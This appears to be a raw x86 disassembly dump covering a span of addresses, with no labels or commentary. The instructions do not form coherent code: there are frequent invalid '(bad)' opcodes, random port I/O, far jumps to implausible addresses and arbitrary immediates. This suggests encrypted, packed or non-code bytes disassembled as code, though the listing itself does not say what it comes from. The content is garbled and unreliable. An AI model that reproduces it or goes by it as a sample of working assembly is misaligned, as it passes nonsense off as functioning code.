  40ee8f:	mov    bl,0x6f
  40ee91:	or     DWORD PTR [ecx-0x28],edx
  40ee94:	test   BYTE PTR [esi-0x3c0433fe],dl
  40ee9a:	sti    
  40ee9b:	pop    edi
  40ee9c:	jge    0x40ef00
  40ee9e:	mov    ebp,0x6f539dc
  40eea3:	enter  0x89e6,0x97
  40eea7:	mov    es,WORD PTR [edx+ebx*4+0x2f]
  40eeab:	test   bl,ch
  40eead:	test   BYTE PTR ds:0x1b4ee22d,dl
  40eeb3:	mov    esp,0x348bdfbf
  40eeb8:	imul   ecx,DWORD PTR ds:0x455b08c3,0x3074b7fd
  40eec2:	dec    ebx
  40eec3:	in     al,dx
  40eec4:	or     edi,DWORD PTR [esi+0x2aec7ec]
  40eeca:	jle    0x40eeae
  40eecc:	xor    eax,0xeb16ad44
  40eed1:	dec    ebx
  40eed2:	fwait
  40eed3:	jp     0x40ee55
  40eed5:	loopne 0x40eeee
  40eed7:	adc    al,0x48
  40eed9:	add    esp,ecx
  40eedb:	mov    ch,0xbc
  40eedd:	fist   WORD PTR [ecx]
  40eedf:	(bad)  
  40eee0:	aam    0x6b
  40eee2:	out    dx,eax
  40eee3:	push   ss
  40eee4:	jmp    0x40ee71
  40eee6:	clc    
  40eee7:	push   ebp
  40eee8:	scas   eax,DWORD PTR es:[edi]
  40eee9:	jge    0x40eea2
  40eeeb:	ds je  0x40eecd
  40eeee:	bound  edi,QWORD PTR [ecx-0x28d4193d]
  40eef4:	pop    ecx
  40eef5:	mov    dh,0xe0
  40eef7:	adc    esp,DWORD PTR ds:0xbbdfe847
  40eefd:	fistp  QWORD PTR [edx-0x13]
  40ef00:	push   es
  40ef01:	or     cl,BYTE PTR [eax-0x48]
  40ef04:	adc    eax,DWORD PTR [esi]
  40ef06:	mov    eax,ds:0x7d4ee307
  40ef0b:	mov    bl,0xf7
  40ef0d:	loop   0x40ef4a
  40ef0f:	(bad)  
  40ef11:	jmp    0x40ef0f
  40ef13:	imul   esi,DWORD PTR [edx+0x49f9af35],0xfffffffe
  40ef1a:	adc    al,0x18
  40ef1c:	push   0x2b62e9df
  40ef21:	add    dh,BYTE PTR [edi]
  40ef23:	mov    eax,ds:0x9efd5e5a
  40ef28:	test   eax,0x1ef97f59
  40ef2d:	push   edi
  40ef2e:	(bad)  
  40ef2f:	mov    esp,0x488a08f4
  40ef34:	push   eax
  40ef35:	and    eax,0xa879b0e0
  40ef3a:	cld    
  40ef3b:	mov    al,ds:0x8469ed61
  40ef40:	arpl   WORD PTR [eax+eax*8-0x63],si
  40ef44:	test   DWORD PTR [edi],eax
  40ef46:	dec    ecx
  40ef47:	cwde   
  40ef48:	adc    al,0xf
  40ef4a:	dec    ebp
  40ef4b:	sub    al,0x15
  40ef4d:	ins    BYTE PTR es:[edi],dx
  40ef4e:	std    
  40ef4f:	je     0x40ef81
  40ef51:	add    ebx,ebx
  40ef53:	dec    ecx
  40ef54:	inc    esi
  40ef55:	jno    0x40efcf
  40ef57:	leave  
  40ef58:	icebp  
  40ef59:	pop    ecx
  40ef5a:	lods   al,BYTE PTR ds:[esi]
  40ef5b:	popf   
  40ef5c:	and    DWORD PTR [edi],ebx
  40ef5e:	ins    BYTE PTR es:[edi],dx
  40ef5f:	xor    edx,DWORD PTR [ebx]
  40ef61:	ss fwait
  40ef63:	mov    edi,0x79ec77eb
  40ef68:	loop   0x40ef3c
  40ef6a:	jb     0x40ef03
  40ef6c:	mov    cl,0xdf
  40ef6e:	sahf   
  40ef6f:	clc    
  40ef70:	mov    db5,eax
  40ef73:	pop    ecx
  40ef74:	rol    BYTE PTR [esi],0x3
  40ef77:	fidivr WORD PTR [edi]
  40ef79:	retf   0x1c03
  40ef7c:	jmp    0x40ef6f
  40ef7e:	inc    esp
  40ef7f:	xchg   esi,eax
  40ef80:	test   al,0xf2
  40ef82:	lods   eax,DWORD PTR ds:[esi]
  40ef83:	enter  0x930c,0x26
  40ef87:	(bad)  
  40ef88:	mov    esp,0xeb7e90ab
  40ef8d:	dec    ebx
  40ef8e:	dec    BYTE PTR [ebx+0x6c]
  40ef91:	jg     0x40efd2
  40ef93:	jg     0x40efb0
  40ef95:	jmp    0x40efb2
  40ef97:	or     edi,DWORD PTR [ecx+0x1f]
  40ef9a:	enter  0x5399,0x8b
  40ef9e:	and    eax,DWORD PTR [edi-0x15]
  40efa1:	inc    eax
  40efa2:	call   FWORD PTR [edx]
  40efa4:	mov    bh,0x27
  40efa6:	(bad)  
  40efa8:	fcmovu st,st(0)
  40efaa:	fcmovb st,st(5)
  40efac:	push   cs
  40efad:	ret    
  40efae:	pop    esp
  40efaf:	sbb    al,0x9b
  40efb1:	cmp    eax,0x9cebaf0c
  40efb6:	shl    DWORD PTR [esi-0x705aa217],0x42
  40efbd:	fild   WORD PTR [esi-0x4003ff47]
  40efc3:	or     al,0x2b
  40efc5:	scas   eax,DWORD PTR es:[edi]
  40efc6:	jmp    DWORD PTR [edi]
  40efc8:	dec    edi
  40efc9:	mul    bh
  40efcb:	fisub  DWORD PTR [esi+0x3319623c]
  40efd1:	rcl    BYTE PTR [edx+ecx*4-0x23f92006],cl
  40efd8:	or     al,0xae
  40efda:	adc    ebx,ecx
  40efdc:	push   edx
  40efdd:	les    esp,FWORD PTR [edi]
  40efdf:	fwait
  40efe0:	in     eax,dx
  40efe1:	inc    ebx
  40efe2:	or     DWORD PTR [ecx+0x59],edx
  40efe5:	mov    edi,0xc31f413f
  40efea:	fucomip st,st(5)
  40efec:	pop    ss
  40efed:	test   al,0x1a
  40efef:	enter  0x39e4,0x91
  40eff3:	aas    
  40eff4:	sub    DWORD PTR [eax],ecx
  40eff6:	add    al,0xe
  40eff8:	dec    esp
  40eff9:	pop    esp
  40effa:	jge    0x40f02b
  40effc:	sbb    cl,BYTE PTR [edx]
  40effe:	xchg   ebp,eax
  40efff:	xchg   edi,eax
  40f000:	iret   
  40f001:	fbld   TBYTE PTR [ecx-0x426a4198]
  40f007:	inc    ebp
  40f008:	pop    ebp
  40f009:	push   0x1538dfd
  40f00e:	aam    0xc9
  40f010:	dec    esp
  40f011:	aad    0x2e
  40f013:	leave  
  40f014:	xor    BYTE PTR [eax],bh
  40f016:	cwde   
  40f017:	into   
  40f018:	inc    ebx
  40f019:	xchg   ecx,eax
  40f01a:	xchg   ebp,eax
  40f01b:	pop    es
  40f01c:	xor    DWORD PTR [edx-0x35],0xfffffff3
  40f020:	jmp    0x40efca
  40f022:	sbb    al,0x24
  40f024:	push   ecx
  40f025:	stos   DWORD PTR es:[edi],eax
  40f026:	jbe    0x40efe0
  40f028:	or     bh,bl
  40f02a:	scas   al,BYTE PTR es:[edi]
  40f02b:	sbb    al,0xff
  40f02d:	xlat   BYTE PTR ds:[ebx]
  40f02e:	and    BYTE PTR [ebx],dh
  40f030:	pop    ebp
  40f031:	rol    DWORD PTR [edx],0x37
  40f034:	ret    0xcba1
  40f037:	(bad)  
  40f038:	jmp    0x40f01f
  40f03a:	jecxz  0x40f03a
  40f03c:	and    eax,0x79c995b8
  40f041:	bound  ebp,QWORD PTR [ecx]
  40f043:	xor    esp,DWORD PTR [ebx-0x5e]
  40f046:	sub    DWORD PTR [eax-0x7f032f8f],0x68e4787c
  40f050:	shl    dh,cl
  40f052:	push   ebp
  40f053:	enter  0x52a4,0xc3
  40f057:	inc    eax
  40f058:	jbe    0x40f021
  40f05a:	repz mov edi,0xb50d2cfd
  40f060:	sub    edx,ecx
  40f062:	or     bl,bh
  40f064:	cmp    ecx,DWORD PTR [edx+edx*8]
  40f067:	push   edi
  40f068:	lahf   
  40f069:	fdivr  QWORD PTR [esi+ebx*4]
  40f06c:	adc    BYTE PTR ds:0xd76b229f,bl
  40f072:	dec    eax
  40f073:	push   0x7f6c7beb
  40f078:	mov    BYTE PTR [ecx+eiz*2+0x65],dl
  40f07c:	mov    esp,0xd4f40cdf
  40f081:	and    BYTE PTR [eax],al
  40f083:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f084:	xchg   esi,eax
  40f085:	out    0xfc,al
  40f087:	sbb    al,0x33
  40f089:	sbb    bh,al
  40f08b:	sub    eax,0x60389a6b
  40f090:	mov    edi,ds
  40f092:	ror    DWORD PTR [edi+ebx*2+0x77],1
  40f096:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f097:	push   cs
  40f098:	pop    ebp
  40f099:	push   ds
  40f09a:	std    
  40f09b:	sub    BYTE PTR [ebx],ah
  40f09d:	(bad)  
  40f09e:	pop    edx
  40f09f:	scas   eax,DWORD PTR es:[edi]
  40f0a0:	push   ebp
  40f0a1:	push   es
  40f0a2:	retf   0x891c
  40f0a5:	fnstcw WORD PTR [ebx+0x5a]
  40f0a8:	mov    WORD PTR [ebx],?
  40f0aa:	mov    ebp,0xb5fdce91
  40f0af:	sub    ah,dh
  40f0b1:	stc    
  40f0b2:	int    0xc5
  40f0b4:	fld    QWORD PTR [esi+ebx*2+0x40140e03]
  40f0bb:	push   ds
  40f0bc:	fwait
  40f0bd:	daa    
  40f0be:	or     ch,dh
  40f0c0:	xchg   edi,eax
  40f0c1:	pop    es
  40f0c2:	(bad)  
  40f0c4:	imul   edi,DWORD PTR ds:0xb818fe3c,0x2a
  40f0cb:	dec    edx
  40f0cc:	ret    
  40f0cd:	pop    ss
  40f0ce:	aaa    
  40f0cf:	xchg   edi,eax
  40f0d0:	jmp    0x40f0cb
  40f0d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0d3:	inc    eax
  40f0d4:	retf   0x1599
  40f0d7:	int    0x64
  40f0d9:	fild   QWORD PTR [edx-0x750f5f4d]
  40f0df:	pxor   mm6,QWORD PTR [edx]
  40f0e2:	std    
  40f0e3:	push   ds
  40f0e4:	aad    0x22
  40f0e6:	enter  0x88ed,0xd4
  40f0ea:	or     al,0xfa
  40f0ed:	jle    0x40f154
  40f0ef:	xchg   esi,eax
  40f0f0:	ror    DWORD PTR [esi+0x2d],1
  40f0f3:	jnp    0x40f094
  40f0f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0f6:	cld    
  40f0f7:	ins    DWORD PTR es:[edi],dx
  40f0f8:	push   ebx
  40f0f9:	mov    esi,0x4665f530
  40f0fe:	push   esp
  40f0ff:	enter  0xe5dd,0xc6
  40f103:	sbb    eax,DWORD PTR [eax]
  40f105:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40f107:	out    0xe8,al
  40f109:	daa    
  40f10a:	out    0xe8,eax
  40f10c:	push   0x22
  40f10e:	jge    0x40f17d
  40f110:	cmp    DWORD PTR [edx],esi
  40f112:	inc    esi
  40f113:	enter  0x4efc,0x53
  40f117:	mov    BYTE PTR [edi],cl
  40f119:	pop    esi
  40f11a:	ret    
  40f11b:	test   BYTE PTR [ecx-0x14f75367],bl
  40f121:	aaa    
  40f122:	pop    es
  40f123:	arpl   WORD PTR [ebx],si
  40f125:	mov    BYTE PTR [edx+0x17],bh
  40f128:	jne    0x40f109
  40f12a:	gs cmp cl,dh
  40f12d:	retf   
  40f12e:	sub    DWORD PTR [edx+0x6e98ee67],eax
  40f134:	adc    DWORD PTR [esi-0x2b],0x75
  40f138:	sbb    al,0x91
  40f13a:	(bad)  
  40f13b:	xchg   ebp,eax
  40f13c:	lds    edx,FWORD PTR [edx]
  40f13e:	push   ecx
  40f13f:	fidivr DWORD PTR [edx]
  40f141:	aam    0xc0
  40f143:	sahf   
  40f144:	jno    0x40f125
  40f146:	sub    BYTE PTR [esp+ecx*1-0x619194db],ah
  40f14d:	lahf   
  40f14e:	mov    ds:0x3a7eeb19,al
  40f153:	std    
  40f154:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f155:	dec    ecx
  40f156:	adc    eax,0xf7dddb95
  40f15b:	enter  0x6702,0xc
  40f15f:	inc    eax
  40f160:	sub    ecx,esi
  40f162:	dec    esp
  40f163:	call   0x215c3e53
  40f168:	push   cs
  40f169:	mov    ecx,0xdf48e182
  40f16e:	jnp    0x40f118
  40f170:	adc    ebx,DWORD PTR [ecx+0x27dc3ff3]
  40f176:	std    
  40f177:	adc    DWORD PTR [ebp+edi*2-0x2b1c61d2],ebp
  40f17e:	push   esp
  40f17f:	enter  0x63e1,0xe9
  40f183:	xor    al,0xdd
  40f185:	in     al,dx
  40f186:	xchg   edx,eax
  40f187:	xchg   esi,eax
  40f188:	jmp    0x40f1a7
  40f18a:	cwde   
  40f18b:	cmc    
  40f18c:	es test al,0xff
  40f18f:	popf   
  40f190:	add    bh,0x19
  40f193:	enter  0x63bf,0xc1
  40f197:	and    DWORD PTR ds:0xeb3430b3,esp
  40f19d:	mov    ds:0x3954d356,al
  40f1a2:	int3   
  40f1a3:	sti    
  40f1a4:	adc    eax,0x8fadd3d9
  40f1a9:	imul   edi,DWORD PTR [ebp-0x61413447],0x61
  40f1b0:	in     eax,dx
  40f1b1:	int    0xfe
  40f1b3:	je     0x40f189
  40f1b5:	aas    
  40f1b6:	pop    edx
  40f1b7:	je     0x40f1d9
  40f1b9:	sahf   
  40f1ba:	bswap  esi
  40f1bc:	cmc    
  40f1bd:	push   edi
  40f1be:	mov    BYTE PTR [ebx-0x3a],cl
  40f1c1:	data16 mov BYTE PTR es:[ebx+eax*1-0x42],cl
  40f1c7:	(bad)
  40f1ca:	ins    DWORD PTR es:[edi],dx
  40f1cb:	adc    DWORD PTR [eax+0x78],edx
  40f1ce:	nop
  40f1cf:	pop    esi
  40f1d0:	sub    ecx,DWORD PTR [eax]
  40f1d2:	jmp    0x32125cee
  40f1d7:	je     0x40f220
  40f1d9:	mov    ds:0x9debe35f,eax
  40f1de:	xchg   al,al
  40f1e0:	pop    ss
  40f1e1:	dec    esp
  40f1e2:	xchg   edi,eax
  40f1e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1e4:	neg    edi
  40f1e6:	add    BYTE PTR [edx],al
  40f1e8:	pop    ebx
  40f1e9:	je     0x40f20c
  40f1eb:	ret    
  40f1ec:	jno    0x40f1e8
  40f1ee:	cld    
  40f1ef:	or     eax,0xd37ac809
  40f1f4:	sbb    edi,DWORD PTR [edx+0x2b]
  40f1f7:	enter  0x9f2a,0x97
  40f1fb:	xor    BYTE PTR [edx],ah
  40f1fd:	in     al,dx
  40f1fe:	adc    ebx,ebp
  40f200:	jmp    0x40f1e8
  40f202:	jbe    0x40f261
  40f204:	(bad)  
  40f205:	xor    eax,DWORD PTR [ecx-0x19]
  40f208:	and    eax,0xdfb147df
  40f20d:	repnz lds edi,FWORD PTR [ebx-0x44]
  40f211:	jbe    0x40f210
  40f213:	sahf   
  40f214:	xor    BYTE PTR [edi+0x1866dac3],ch
  40f21a:	jae    0x40f1fe
  40f21c:	mov    ds:0x55437d22,eax
  40f221:	dec    edi
  40f222:	xor    ch,BYTE PTR [ebx]
  40f224:	pop    ecx
  40f225:	push   eax
  40f226:	std    
  40f227:	lods   eax,DWORD PTR gs:[esi]
  40f229:	jle    0x40f27e
  40f22b:	(bad)  
  40f22c:	xor    BYTE PTR [ebp+esi*1-0x38],cl
  40f230:	mov    edx,ecx
  40f232:	pushf  
  40f233:	cmp    al,0xf
  40f235:	mov    ch,0xf7
  40f237:	jge    0x40f21d
  40f239:	xchg   edx,eax
  40f23a:	jge    0x40f284
  40f23c:	scas   eax,DWORD PTR es:[edi]
  40f23d:	rcl    DWORD PTR [edi+0x11],cl
  40f240:	and    eax,0xaac9acaa
  40f245:	call   0x2fe4:0x29487c0f
  40f24c:	gs retf 0x43fc
  40f250:	push   esi
  40f251:	xor    al,0x2c
  40f253:	popa   
  40f254:	mov    edx,0x32ca468e
  40f259:	loopne 0x40f25a
  40f25b:	pop    ebx
  40f25c:	cwde   
  40f25d:	xchg   DWORD PTR [eax-0x4f31f42a],esp
  40f263:	icebp  
  40f264:	jmp    0x40f290
  40f266:	test   BYTE PTR [edi-0x51],dh
  40f269:	adc    bh,cl
  40f26b:	test   al,0xe
  40f26d:	lock mov edx,0x1bdf66b7
  40f273:	mov    edi,0x7a15d995
  40f278:	sbb    esp,ebp
  40f27a:	jmp    DWORD PTR [ebx-0x26]
  40f27d:	jns    0x40f2d9
  40f27f:	mov    ecx,0x97dd77ca
  40f284:	xor    bh,bl
  40f286:	mov    esi,0x7069ac11
  40f28b:	pop    DWORD PTR [ebp+0x22]
  40f28e:	loope  0x40f302
  40f290:	pop    ebp
  40f291:	pop    edi
  40f292:	cmc    
  40f293:	popf   
  40f294:	adc    DWORD PTR [eax],ebp
  40f296:	inc    edx
  40f297:	cmp    eax,0x6598df73
  40f29c:	ins    BYTE PTR es:[edi],dx
  40f29d:	dec    ebp
  40f29e:	mov    ebp,0xfcbb06d7
  40f2a3:	or     eax,0x2316a80b
  40f2a8:	int    0x48
  40f2aa:	inc    ebp
  40f2ab:	mov    esp,0x5cff0931
  40f2b0:	out    0xe3,al
  40f2b2:	dec    edx
  40f2b3:	stos   BYTE PTR es:[edi],al
  40f2b4:	jecxz  0x40f295
  40f2b6:	rcl    DWORD PTR [edi-0xc],0xa5
  40f2ba:	out    0x88,eax
  40f2bc:	sbb    cl,0x17
  40f2bf:	adc    bl,BYTE PTR [esi-0x660f3501]
  40f2c5:	cmp    edi,0xffffffc7
  40f2c8:	std    
  40f2c9:	mov    ebx,0xfb04cbe4
  40f2ce:	jge    0x40f30c
  40f2d0:	jmp    0x40f258
  40f2d2:	inc    esi
  40f2d3:	sub    cl,BYTE PTR [esi-0x30]
  40f2d6:	mov    bl,BYTE PTR ds:0xc11df9c
  40f2dc:	retf   
  40f2dd:	jns    0x40f327
  40f2df:	hlt    
  40f2e0:	scas   eax,DWORD PTR es:[edi]
  40f2e1:	sbb    eax,0xa0e67228
  40f2e6:	mov    esp,0xdcf81a55
  40f2eb:	add    eax,DWORD PTR [esi*2-0x580934a1]
  40f2f2:	lahf   
  40f2f3:	retf   
  40f2f4:	jo     0x40f277
  40f2f6:	lods   eax,DWORD PTR ds:[esi]
  40f2f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2f8:	shr    DWORD PTR [ebp-0x3],1
  40f2fb:	and    BYTE PTR [edx+0x49],cl
  40f2fe:	mov    ecx,0x639ec094
  40f303:	enter  0x7307,0x9b
  40f307:	loop   0x40f362
  40f309:	fldcw  WORD PTR [ecx-0x70]
  40f30c:	(bad)  
  40f30d:	sub    ecx,DWORD PTR [esi-0x7f]
  40f310:	in     al,dx
  40f311:	jle    0x40f36f
  40f313:	lods   al,BYTE PTR ds:[esi]
  40f314:	dec    edi
  40f315:	(bad)  
  40f317:	es fcmovnu st,st(7)
  40f31a:	sub    eax,0x687600e4
  40f31f:	sbb    al,0x5a
  40f321:	mov    DWORD PTR [ebx+0x5b1eb78],ebx
  40f327:	xchg   esi,eax
  40f328:	adc    BYTE PTR [edx-0x61],ch
  40f32b:	imul   edi,DWORD PTR [ecx+0x668a06de],0x9ad1ee42
  40f335:	push   ebx
  40f336:	sub    eax,0xca8aeb99
  40f33b:	xor    al,0xbf
  40f33d:	mov    ebx,0xdffc94ae
  40f342:	clc    
  40f343:	repz and esp,esp
  40f346:	(bad)  
  40f347:	or     BYTE PTR [ebx],dh
  40f349:	fwait
  40f34a:	cld    
  40f34b:	mov    ebx,0xf9ad8a14
  40f350:	lods   eax,DWORD PTR ds:[esi]
  40f351:	aad    0x49
  40f353:	enter  0x45b0,0x40
  40f357:	sti    
  40f358:	sbb    al,0xea
  40f35a:	pop    esp
  40f35b:	ficomp WORD PTR [edi-0x78670a]
  40f361:	push   ecx
  40f362:	bound  edi,QWORD PTR [ecx]
  40f364:	sub    esp,DWORD PTR [ecx+0x545fa859]
  40f36a:	dec    ebp
  40f36b:	enter  0x76a3,0xdb
  40f36f:	hlt    
  40f370:	mov    eax,ds:0xed7411dd
  40f375:	sbb    eax,0x9f27eb26
  40f37a:	jns    0x40f30e
  40f37c:	pop    edx
  40f37d:	fs inc edi
  40f37f:	xchg   ebp,eax
  40f380:	xor    ebx,edi
  40f382:	add    eax,0xd1baa150
  40f387:	fistp  WORD PTR [ecx-0x23]
  40f38a:	cld    
  40f38b:	xor    eax,0x887c3300
  40f390:	repnz out 0x6c,eax
  40f393:	enter  0x1792,0xce
  40f397:	sbb    BYTE PTR [edi+0x61],al
  40f39a:	mov    esi,0xda12ec3b
  40f39f:	add    BYTE PTR [ecx+0x27c33dfc],cl
  40f3a5:	sub    BYTE PTR [ecx-0x30fac1e],al
  40f3ab:	pop    ecx
  40f3ac:	dec    esp
  40f3ad:	sti    
  40f3ae:	sahf   
  40f3af:	jg     0x40f340
  40f3b1:	xor    eax,0xfe6ceefd
  40f3b6:	(bad)  
  40f3b7:	std    
  40f3b8:	out    0x2b,al
  40f3ba:	jne    0x40f38d
  40f3bc:	xor    eax,0xebe0d658
  40f3c1:	inc    edx
  40f3c2:	adc    BYTE PTR [ecx-0x190307f1],bh
  40f3c8:	in     al,dx
  40f3c9:	loope  0x40f3bf
  40f3cb:	dec    ebx
  40f3cc:	loope  0x40f430
  40f3ce:	push   ss
  40f3cf:	sbb    cl,BYTE PTR [ecx-0x20]
  40f3d2:	imul   ecx,ebp,0x68964d62
  40f3d8:	clc    
  40f3d9:	lods   eax,DWORD PTR ds:[esi]
  40f3da:	xlat   BYTE PTR ds:[ebx]
  40f3db:	jg     0x40f379
  40f3dd:	in     eax,0xfc
  40f3df:	or     ch,dl
  40f3e1:	jmp    0x40f45e
  40f3e3:	push   ds
  40f3e4:	fs es retf 0xf2c8
  40f3e9:	jne    0x40f389
  40f3eb:	out    0x89,eax
  40f3ed:	repz mov ecx,edi
  40f3f0:	out    0xa0,al
  40f3f2:	jmp    0x40f3d2
  40f3f4:	(bad)
  40f3f8:	jmp    FWORD PTR [ecx]
  40f3fa:	cdq    
  40f3fb:	fcomp  st(6)
  40f3fd:	call   0xd9ed2390
  40f402:	clc    
  40f403:	push   ss
  40f404:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f405:	ret    
  40f406:	mov    esp,0xc6de6c15
  40f40b:	add    BYTE PTR [edx],0x3
  40f40e:	adc    eax,0x6b1f7bfd
  40f413:	test   bl,ch
  40f415:	pushf  
  40f416:	dec    ebp
  40f417:	pop    esp
  40f418:	dec    ebx
  40f419:	fiadd  DWORD PTR [ecx]
  40f41b:	(bad)  
  40f41d:	(bad)  
  40f41f:	inc    eax
  40f420:	and    BYTE PTR [edx+0x7d0e1f23],bl
  40f426:	(bad)  
  40f427:	sti    
  40f428:	std    
  40f429:	ss sbb eax,0xde57093f
  40f42f:	aad    0x27
  40f431:	daa    
  40f432:	mov    ch,0x2e
  40f434:	dec    ebx
  40f435:	fild   WORD PTR [esi+0x3c]
  40f438:	mov    eax,ds:0x58a6210a
  40f43d:	fld    TBYTE PTR [esi+0x36ceaee]
  40f443:	cmp    DWORD PTR [edx+0xb47935f],ecx
  40f449:	pushf  
  40f44a:	pusha  
  40f44b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f44c:	xor    dl,bl
  40f44e:	(bad)  
  40f44f:	jecxz  0x40f416
  40f451:	lods   al,BYTE PTR ds:[esi]
  40f452:	jge    0x40f3f1
  40f454:	into   
  40f455:	cmp    al,0xc7
  40f457:	mov    al,ds:0x193d51fd
  40f45c:	pop    esi
  40f45d:	push   edi
  40f45e:	add    ch,dh
  40f460:	dec    ebp
  40f461:	(bad)  
  40f462:	(bad)  
  40f464:	sub    al,0x27
  40f466:	stos   BYTE PTR es:[edi],al
  40f467:	rcr    DWORD PTR [eax+0xbbde8df],cl
  40f46d:	adc    al,0xa8
  40f46f:	jle    0x40f450
  40f471:	and    edx,DWORD PTR [ebx+0xdc9fe76]
  40f477:	adc    ch,BYTE PTR [ebx+0x11]
  40f47a:	ret    0xb31a
  40f47d:	cmp    ebp,DWORD PTR [ebp-0x3534f238]
  40f483:	or     DWORD PTR [edi-0x14507875],esp
  40f489:	in     eax,dx
  40f48a:	retf   
  40f48b:	xchg   ebp,eax
  40f48c:	adc    BYTE PTR [eax-0x5d],al
  40f48f:	out    dx,al
  40f490:	dec    BYTE PTR [ecx]
  40f492:	js     0x40f427
  40f494:	jmp    0x40f437
  40f496:	push   0x1acad11f
  40f49b:	into   
  40f49c:	jmp    0x40f51b
  40f49e:	int    0x92
  40f4a0:	inc    eax
  40f4a1:	ja     0x40f4b0
  40f4a3:	cdq    
  40f4a4:	loope  0x40f485
  40f4a6:	xchg   edx,eax
  40f4a7:	sahf   
  40f4a8:	xor    BYTE PTR [esi+0x21ea9056],dh
  40f4ae:	loope  0x40f4c3
  40f4b0:	pop    eax
  40f4b1:	pop    edi
  40f4b2:	xchg   BYTE PTR [edi+edx*4-0x2c],ah
  40f4b6:	jmp    0x550:0x6edf428b
  40f4bd:	mov    bh,0x9d
  40f4bf:	xchg   BYTE PTR [esi+0x4331004],ah
  40f4c5:	adc    ch,bh
  40f4c7:	xchg   esi,eax
  40f4c8:	mov    BYTE PTR [ebp+0x61],al
  40f4cb:	int3   
  40f4cc:	mov    ds:0xade2e4c4,eax
  40f4d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4d2:	bound  ecx,QWORD PTR [ecx+0x19cb2deb]
  40f4d8:	mov    dl,0x7a
  40f4da:	fcomp  DWORD PTR [ebx-0x7ce70307]
  40f4e0:	jmp    0x40f4db
  40f4e2:	pop    ecx
  40f4e3:	dec    ebx
  40f4e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4e5:	nop
  40f4e6:	ins    DWORD PTR es:[edi],dx
  40f4e7:	iret   
  40f4e8:	pusha  
  40f4e9:	adc    eax,0xdb4b8f43
  40f4ee:	sbb    ebp,0xffffffc7
  40f4f1:	(bad)  
  40f4f2:	cld    
  40f4f3:	pop    ebp
  40f4f4:	dec    eax
  40f4f5:	daa    
  40f4f6:	dec    ebx
  40f4f7:	push   0xb31e7a11
  40f4fc:	adc    edi,DWORD PTR [ebx]
  40f4fe:	std    
  40f4ff:	sub    al,0x8e
  40f501:	cli    
  40f502:	and    BYTE PTR [esi-0x4030c65],cl
  40f508:	imul   eax,DWORD PTR [esi+0x1c30975],0xffffff90
  40f50f:	enter  0xd9f8,0xa5
  40f513:	mov    edi,0xe7e28ea9
  40f518:	out    0x12,al
  40f51a:	adc    ebx,DWORD PTR [esi]
  40f51c:	pop    ds
  40f51d:	imul   ebp,DWORD PTR ds:0x4caaade0,0xffffffc8
  40f524:	clc    
  40f525:	mov    bh,0xd3
  40f527:	pusha  
  40f528:	aas    
  40f529:	sub    BYTE PTR [edi],cl
  40f52b:	xor    eax,0x2b978b00
  40f530:	je     0x40f5aa
  40f532:	fild   DWORD PTR [edi+0x34]
  40f535:	push   cs
  40f536:	add    ebp,DWORD PTR [ecx]
  40f538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f539:	loopne 0x40f56b
  40f53b:	cmp    BYTE PTR [ebx-0x324767de],dl
  40f541:	adc    DWORD PTR [esi+eax*4-0x15],ecx
  40f545:	int    0xb6
  40f547:	mov    cl,0xa
  40f549:	outs   dx,BYTE PTR ds:[esi]
  40f54a:	adc    al,0x61
  40f54c:	push   0xffffffd8
  40f54e:	addr16 mov ecx,0x627d5b9c
  40f554:	or     BYTE PTR [ebx],al
  40f556:	mov    BYTE PTR [edx-0x1102e0dd],0xbf
  40f55d:	and    esp,DWORD PTR [ebx-0x1e5bfd7f]
  40f563:	(bad)  
  40f564:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f565:	xchg   esi,eax
  40f566:	mov    edi,DWORD PTR [esi+0x20906eea]
  40f56c:	jmp    0x40f540
  40f56e:	daa    
  40f56f:	add    eax,0x8d4f170a
  40f574:	gs loopne 0x40f5ea
  40f577:	std    
  40f578:	dec    edx
  40f579:	leave  
  40f57a:	mov    bh,0x98
  40f57c:	inc    bl
  40f57e:	mov    eax,ds:0x3dafe9a3
  40f583:	dec    esp
  40f584:	push   cs
  40f585:	mov    ss,edi
  40f587:	daa    
  40f588:	sbb    DWORD PTR [edx+0x2],esp
  40f58b:	mov    ebp,0x88c6aace
  40f590:	sti    
  40f591:	ja     0x40f5db
  40f593:	jbe    0x40f613
  40f595:	test   al,0xf7
  40f597:	jmp    0x483f40ca
  40f59c:	stc    
  40f59d:	cmp    BYTE PTR [ebx-0x1f],ah
  40f5a0:	or     eax,0xa1ecb1d4
  40f5a5:	pop    es
  40f5a6:	jge    0x40f5fb
  40f5a8:	jno    0x40f542
  40f5aa:	daa    
  40f5ab:	jns    0x40f597
  40f5ad:	jne    0x40f559
  40f5af:	jno    0x40f56c
  40f5b1:	das    
  40f5b2:	cmp    BYTE PTR [ecx+0x1a],bl
  40f5b5:	mov    ds:0xdcad2cac,eax
  40f5ba:	popf   
  40f5bb:	ds pop ebx
  40f5bd:	test   BYTE PTR [edi],bl
  40f5bf:	dec    esp
  40f5c0:	push   ebx
  40f5c1:	cli    
  40f5c2:	or     DWORD PTR [edi+0x485916de],esp
  40f5c8:	(bad)  
  40f5c9:	pop    eax
  40f5ca:	lahf   
  40f5cb:	add    al,0xb
  40f5cd:	ret    
  40f5ce:	sub    esp,ebx
  40f5d0:	dec    ebp
  40f5d1:	in     eax,dx
  40f5d2:	cld    
  40f5d3:	pop    eax
  40f5d4:	fist   DWORD PTR [ebx-0x17]
  40f5d7:	js     0x40f57d
  40f5d9:	lods   al,BYTE PTR ds:[esi]
  40f5da:	cld    
  40f5db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5dc:	out    dx,eax
  40f5dd:	dec    esp
  40f5de:	xor    bh,al
  40f5e0:	stos   BYTE PTR es:[edi],al
  40f5e1:	ins    BYTE PTR es:[edi],dx
